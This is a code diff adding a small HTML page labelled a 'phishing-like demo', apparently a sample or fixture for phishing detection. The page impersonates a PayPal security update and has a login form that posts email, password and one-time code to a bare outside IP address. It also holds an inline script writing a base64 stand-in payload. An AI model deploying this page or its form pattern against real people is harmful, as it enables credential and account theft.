@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>PayPal Security Update</title>
+    <link rel="stylesheet" href="demo.css" />
+  </head>
+  <body>
+    <div class="badge">Phishing-like demo</div>
+    <div class="card">
+      <h1>PayPal Security Update</h1>
+      <p>Login to verify your account before access is restored.</p>
+      <form action="http://45.123.45.67/login.php" method="post">
+        <input type="email" name="email" placeholder="Email" />
+        <input type="password" name="password" placeholder="Password" />
+        <input type="text" name="otp" placeholder="One-time code" />
+        <button type="submit">Verify account</button>
+      </form>
+      <script>
+        const payload = 'aGVsbG8=';
+        document.write(payload);
+      </script>
+    </div>
+  </body>
+</html>
